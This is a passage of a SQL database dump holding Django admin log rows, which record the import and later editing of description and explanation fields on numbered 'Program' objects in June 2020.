import_export',10,1),(402,'2020-06-04 04:18:05.082963','1024','Program object (1024)',1,'new through import_export',10,1),(403,'2020-06-04 04:18:05.087963','1025','Program object (1025)',1,'new through import_export',10,1),(404,'2020-06-04 04:18:05.097963','1026','Program object (1026)',1,'new through import_export',10,1),(405,'2020-06-04 04:18:05.102963','1027','Program object (1027)',1,'new through import_export',10,1),(406,'2020-06-04 04:18:05.112963','1028','Program object (1028)',1,'new through import_export',10,1),(407,'2020-06-04 04:18:05.117963','1029','Program object (1029)',1,'new through import_export',10,1),(408,'2020-06-04 04:18:05.122963','1030','Program object (1030)',1,'new through import_export',10,1),(409,'2020-06-04 04:18:05.127963','1031','Program object (1031)',1,'new through import_export',10,1),(410,'2020-06-04 04:18:05.137963','1032','Program object (1032)',1,'new through import_export',10,1),(411,'2020-06-04 04:18:05.142963','1033','Program object (1033)',1,'new through import_export',10,1),(412,'2020-06-04 04:18:05.147963','1034','Program object (1034)',1,'new through import_export',10,1),(413,'2020-06-04 04:18:05.157963','1035','Program object (1035)',1,'new through import_export',10,1),(414,'2020-06-04 04:18:05.192964','1036','Program object (1036)',1,'new through import_export',10,1),(415,'2020-06-04 04:18:05.197964','1037','Program object (1037)',1,'new through import_export',10,1),(416,'2020-06-04 04:18:05.202964','1038','Program object (1038)',1,'new through import_export',10,1),(417,'2020-06-04 04:18:05.207964','1039','Program object (1039)',1,'new through import_export',10,1),(418,'2020-06-04 04:18:05.212964','1040','Program object (1040)',1,'new through import_export',10,1),(419,'2020-06-04 04:18:05.217964','1041','Program object (1041)',1,'new through import_export',10,1),(420,'2020-06-04 04:18:05.227964','1042','Program object (1042)',1,'new through import_export',10,1),(421,'2020-06-04 04:18:05.232964','1043','Program object (1043)',1,'new through import_export',10,1),(422,'2020-06-04 04:18:05.237964','1044','Program object (1044)',1,'new through import_export',10,1),(423,'2020-06-04 04:18:05.242964','1045','Program object (1045)',1,'new through import_export',10,1),(424,'2020-06-04 04:18:05.247964','1046','Program object (1046)',1,'new through import_export',10,1),(425,'2020-06-04 04:18:05.252964','1047','Program object (1047)',1,'new through import_export',10,1),(426,'2020-06-04 04:18:05.262964','1048','Program object (1048)',1,'new through import_export',10,1),(427,'2020-06-04 04:18:05.267964','1049','Program object (1049)',1,'new through import_export',10,1),(428,'2020-06-04 04:18:05.272964','1050','Program object (1050)',1,'new through import_export',10,1),(429,'2020-06-04 04:18:05.277964','1051','Program object (1051)',1,'new through import_export',10,1),(430,'2020-06-04 04:18:05.282964','1052','Program object (1052)',1,'new through import_export',10,1),(431,'2020-06-04 04:18:05.287964','1053','Program object (1053)',1,'new through import_export',10,1),(432,'2020-06-04 04:18:05.297964','1054','Program object (1054)',1,'new through import_export',10,1),(433,'2020-06-04 04:46:05.899030','59','Program object (59)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(434,'2020-06-04 04:49:46.301540','60','Program object (60)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(435,'2020-06-04 04:53:44.229373','61','Program object (61)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(436,'2020-06-04 04:55:44.652542','826','Program object (826)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(437,'2020-06-04 04:56:09.561778','59','Program object (59)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(438,'2020-06-04 04:57:06.632657','60','Program object (60)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(439,'2020-06-04 04:57:54.222125','61','Program object (61)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(440,'2020-06-04 04:59:22.208249','62','Program object (62)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(441,'2020-06-04 05:00:02.505205','62','Program object (62)',2,'[]',10,1),(442,'2020-06-04 05:00:58.477483','63','Program object (63)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(443,'2020-06-04 05:01:53.377559','64','Program object (64)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(444,'2020-06-04 05:03:05.264659','65','Program object (65)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(445,'2020-06-04 05:04:04.731741','66','Program object (66)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(446,'2020-06-04 05:05:10.087831','67','Program object (67)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(447,'2020-06-04 05:06:23.192932','68','Program object (68)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(448,'2020-06-04 05:07:28.063021','69','Program object (69)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(449,'2020-06-04 05:08:43.668527','70','Program object (70)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(450,'2020-06-04 05:09:44.055012','71','Program object (71)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(451,'2020-06-04 05:11:10.777754','72','Program object (72)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(452,'2020-06-04 05:12:44.248357','73','Program object (73)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(453,'2020-06-04 05:14:33.793746','74','Program object (74)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(454,'2020-06-04 05:16:01.012111','75','Program object (75)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(455,'2020-06-04 05:17:07.278781','76','Program object (76)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(456,'2020-06-04 05:18:14.788458','77','Program object (77)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(457,'2020-06-04 05:19:27.813613','78','Program object (78)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(458,'2020-06-04 05:20:23.727028','79','Program object (79)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(459,'2020-06-04 05:21:13.609475','80','Program object (80)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(460,'2020-06-04 05:22:07.096904','81','Program object (81)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(461,'2020-06-04 05:22:41.389838','82','Program object (82)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(462,'2020-06-04 05:23:14.682576','83','Program object (83)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(463,'2020-06-04 05:23:48.017709','84','Program object (84)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(464,'2020-06-04 05:24:22.746448','85','Program object (85)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(465,'2020-06-04 05:25:02.948615','86','Program object (86)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(466,'2020-06-04 05:25:42.654978','86','Program object (86)',2,'[]',10,1),(467,'2020-06-04 05:27:27.440008','87','Program object (87)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(468,'2020-06-04 05:28:36.372481','88','Program object (88)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(469,'2020-06-04 05:29:35.806520','89','Program object (89)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(470,'2020-06-04 05:30:33.975962','90','Program object (90)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(471,'2020-06-04 05:31:07.504106','91','Program object (91)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(472,'2020-06-04 05:31:41.792048','92','Program object (92)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(473,'2020-06-04 05:32:12.177578','93','Program object (93)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(474,'2020-06-04 05:32:45.268710','94','Program object (94)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(475,'2020-06-04 05:33:56.992817','95','Program object (95)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(476,'2020-06-04 05:34:46.304486','96','Program object (96)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(477,'2020-06-04 05:36:06.037731','97','Program object (97)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(478,'2020-06-04 05:36:31.802361','98','Program object (98)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(479,'2020-06-04 05:37:19.100961','99','Program object (99)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(480,'2020-06-04 05:39:21.119940','100','Program object (100)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(481,'2020-06-04 05:40:40.831034','101','Program object (101)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(482,'2020-06-04 05:41:57.959446','102','Program object (102)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(483,'2020-06-04 05:43:43.469481','103','Program object (103)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(484,'2020-06-04 05:45:05.943198','104','Program object (104)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(485,'2020-06-04 05:46:33.464508','105','Program object (105)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(486,'2020-06-04 05:47:49.081833','106','Program object (106)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(487,'2020-06-04 05:48:56.610894','107','Program object (107)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(488,'2020-06-04 05:50:44.866148','108','Program object (108)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(489,'2020-06-04 05:52:22.537259','109','Program object (109)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(490,'2020-06-04 05:54:13.028839','110','Program object (110)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(491,'2020-06-04 05:55:28.984738','111','Program object (111)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(492,'2020-06-04 05:57:48.425098','112','Program object (112)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(493,'2020-06-04 05:59:58.423626','113','Program object (113)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(494,'2020-06-04 06:02:20.306788','114','Program object (114)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(495,'2020-06-04 06:03:59.814608','115','Program object (115)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(496,'2020-06-04 06:05:19.464722','116','Program object (116)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(497,'2020-06-04 06:06:22.232779','741','Program object (741)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(498,'2020-06-04 06:08:31.176898','742','Program object (742)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(499,'2020-06-04 06:10:07.214886','743','Program object (743)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(500,'2020-06-04 06:11:17.964161','744','Program object (744)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(501,'2020-06-04 06:12:45.312115','745','Program object (745)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(502,'2020-06-04 06:14:07.537872','746','Program object (746)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(503,'2020-06-04 06:15:07.711514','747','Program object (747)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(504,'2020-06-04 06:17:44.609739','748','Program object (748)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(505,'2020-06-04 06:18:59.207048','749','Program object (749)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(506,'2020-06-04 06:19:59.539888','750','Program object (750)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(507,'2020-06-04 06:21:14.718451','751','Program object (751)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(508,'2020-06-04 06:22:11.848686','752','Program object (752)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(509,'2020-06-04 06:23:00.112553','868','Program object (868)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(510,'2020-06-04 06:23:37.691459','753','Program object (753)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(511,'2020-06-04 06:24:27.553740','869','Program object (869)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(512,'2020-06-04 06:25:01.618874','754','Program object (754)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(513,'2020-06-04 06:25:46.604666','755','Program object (755)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(514,'2020-06-04 06:25:53.280099','870','Program object (870)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(515,'2020-06-04 06:26:48.953102','871','Program object (871)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(516,'2020-06-04 06:26:53.238123','756','Program object (756)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(517,'2020-06-04 06:28:22.954739','872','Program object (872)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(518,'2020-06-04 06:28:42.320846','873','Program object (873)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(519,'2020-06-04 06:29:05.935197','874','Program object (874)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(520,'2020-06-04 06:29:19.092105','875','Program object (875)',2,'[]',10,1),(521,'2020-06-04 06:29:56.487458','876','Program object (876)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(522,'2020-06-04 06:30:31.677224','757','Program object (757)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(523,'2020-06-04 06:30:39.236906','877','Program object (877)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(524,'2020-06-04 06:31:25.881429','878','Program object (878)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(525,'2020-06-04 06:31:39.925454','758','Program object (758)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(526,'2020-06-04 06:32:34.713812','879','Program object (879)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\"]}}]',10,1),(527,'2020-06-04 06:33:07.594540','880','Program object (880)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(528,'2020-06-04 06:33:36.871847','759','Program object (759)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(529,'2020-06-04 06:33:59.998735','881','Program object (881)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(530,'2020-06-04 06:34:44.859503','760','Program object (760)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(531,'2020-06-04 06:35:08.854652','882','Program object (882)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(532,'2020-06-04 06:36:26.514028','761','Program object (761)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(533,'2020-06-04 06:36:30.521317','883','Program object (883)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(534,'2020-06-04 06:37:16.104214','762','Program object (762)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(535,'2020-06-04 06:37:59.574157','763','Program object (763)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(536,'2020-06-04 06:38:53.062741','764','Program object (764)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(537,'2020-06-04 06:39:46.950720','765','Program object (765)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(538,'2020-06-04 06:39:57.549863','884','Program object (884)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(539,'2020-06-04 06:41:12.531843','766','Program object (766)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(540,'2020-06-04 06:41:55.311607','767','Program object (767)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(541,'2020-06-04 06:42:32.524635','885','Program object (885)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(542,'2020-06-04 06:42:57.003751','768','Program object (768)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(543,'2020-06-04 06:43:57.406792','769','Program object (769)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(544,'2020-06-04 06:44:43.704804','886','Program object (886)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(545,'2020-06-04 06:44:55.033550','770','Program object (770)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(546,'2020-06-04 06:46:22.510598','887','Program object (887)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(547,'2020-06-04 06:46:38.034260','771','Program object (771)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(548,'2020-06-04 06:47:35.770123','772','Program object (772)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(549,'2020-06-04 06:47:35.859128','772','Program object (772)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(550,'2020-06-04 06:48:02.233693','888','Program object (888)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(551,'2020-06-04 06:48:49.788368','773','Program object (773)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(552,'2020-06-04 06:49:25.868251','889','Program object (889)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(553,'2020-06-04 06:50:10.088400','890','Program object (890)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(554,'2020-06-04 06:50:30.751204','774','Program object (774)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(555,'2020-06-04 06:50:46.146221','891','Program object (891)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(556,'2020-06-04 06:51:13.853573','892','Program object (892)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(557,'2020-06-04 06:51:52.369146','775','Program object (775)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(558,'2020-06-04 06:51:53.094959','893','Program object (893)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(559,'2020-06-04 06:52:17.994376','894','Program object (894)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(560,'2020-06-04 06:52:39.258274','895','Program object (895)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(561,'2020-06-04 06:53:10.141131','776','Program object (776)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(562,'2020-06-04 06:53:10.992343','896','Program object (896)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(563,'2020-06-04 06:53:39.365539','897','Program object (897)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(564,'2020-06-04 06:54:41.460104','777','Program object (777)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(565,'2020-06-04 06:54:48.318440','898','Program object (898)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(566,'2020-06-04 06:55:58.363593','778','Program object (778)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(567,'2020-06-04 06:56:04.885292','899','Program object (899)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(568,'2020-06-04 06:56:54.432655','779','Program object (779)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(569,'2020-06-04 06:57:45.099743','900','Program object (900)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(570,'2020-06-04 06:57:59.790150','780','Program object (780)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(571,'2020-06-04 06:58:58.091231','781','Program object (781)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(572,'2020-06-04 07:00:02.555280','782','Program object (782)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(573,'2020-06-04 07:00:43.026309','901','Program object (901)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(574,'2020-06-04 07:01:02.112972','783','Program object (783)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(575,'2020-06-04 07:01:33.153683','902','Program object (902)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(576,'2020-06-04 07:02:18.647369','903','Program object (903)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(577,'2020-06-04 07:02:58.095534','784','Program object (784)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(578,'2020-06-04 07:03:21.726176','904','Program object (904)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(579,'2020-06-04 07:03:50.818197','785','Program object (785)',2,'[{\"changed\": {\"fields\": [\"Program title\", \"Program description\", \"Explanation\"]}}]',10,1),(580,'2020-06-04 07:04:47.941479','786','Program object (786)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(581,'2020-06-04 07:05:00.235172','787','Program object (787)',2,'[]',10,1),(582,'2020-06-04 07:05:02.986833','905','Program object (905)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(583,'2020-06-04 07:05:11.880586','788','Program object (788)',2,'[]',10,1),(584,'2020-06-04 07:05:24.348350','789','Program object (789)',2,'[]',10,1),(585,'2020-06-04 07:06:29.388342','790','Program object (790)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(586,'2020-06-04 07:06:43.686916','906','Program object (906)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(587,'2020-06-04 07:07:38.056833','791','Program object (791)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(588,'2020-06-04 07:08:11.051780','907','Program object (907)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(589,'2020-06-04 07:08:46.857246','908','Program object (908)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(590,'2020-06-04 07:08:49.794090','792','Program object (792)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(591,'2020-06-04 07:09:16.495682','909','Program object (909)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(592,'2020-06-04 07:09:52.451308','910','Program object (910)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(593,'2020-06-04 07:09:56.400378','793','Program object (793)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(594,'2020-06-04 07:10:31.814778','911','Program object (911)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(595,'2020-06-04 07:10:45.640899','912','Program object (912)',2,'[{\"changed\": {\"fields\": [\"Explanation\"]}}]',10,1),(596,'2020-06-04 07:10:55.183823','794','Program object (794)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(597,'2020-06-04 07:11:50.473602','795','Program object (795)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(598,'2020-06-04 07:59:21.359375','913','Program object (913)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(599,'2020-06-04 07:59:47.454446','796','Program object (796)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(600,'2020-06-04 08:01:03.121384','914','Program object (914)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(601,'2020-06-04 08:01:43.091338','797','Program object (797)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(602,'2020-06-04 08:02:33.574538','915','Program object (915)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(603,'2020-06-04 08:02:56.409803','798','Program object (798)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(604,'2020-06-04 08:04:10.839671','916','Program object (916)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(605,'2020-06-04 08:04:13.415344','799','Program object (799)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(606,'2020-06-04 08:05:28.901435','800','Program object (800)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(607,'2020-06-04 08:05:37.284965','917','Program object (917)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(608,'2020-06-04 08:06:42.914466','801','Program object (801)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(609,'2020-06-04 08:06:56.740138','918','Program object (918)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(610,'2020-06-04 08:08:02.552381','919','Program object (919)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(611,'2020-06-04 08:08:28.410688','802','Program object (802)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(612,'2020-06-04 08:09:38.652687','803','Program object (803)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(613,'2020-06-04 08:09:53.126676','920','Program object (920)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(614,'2020-06-04 08:11:02.667243','804','Program object (804)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(615,'2020-06-04 08:11:02.737045','804','Program object (804)',2,'[]',10,1),(616,'2020-06-04 08:11:16.201123','921','Program object (921)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(617,'2020-06-04 08:12:27.499197','805','Program object (805)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(618,'2020-06-04 08:12:27.514797','805','Program object (805)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(619,'2020-06-04 08:13:27.183689','922','Program object (922)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(620,'2020-06-04 08:14:48.902822','923','Program object (923)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(621,'2020-06-04 08:15:23.288921','806','Program object (806)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(622,'2020-06-04 08:15:43.247121','924','Program object (924)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(623,'2020-06-04 08:17:09.247141','925','Program object (925)',2,'[{\"changed\": {\"fields\": [\"Program description\"]}}]',10,1),(624,'2020-06-04 08:18:31.279548','807','Program object (807)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(625,'2020-06-04 08:18:44.412849','926','Program object (926)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(626,'2020-06-04 08:20:04.131549','808','Program object (808)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(627,'2020-06-04 08:20:15.547916','927','Program object (927)',2,'[{\"changed\": {\"fields\": [\"Program description\", \"Explanation\"]}}]',10,1),(628,'2020-06-04 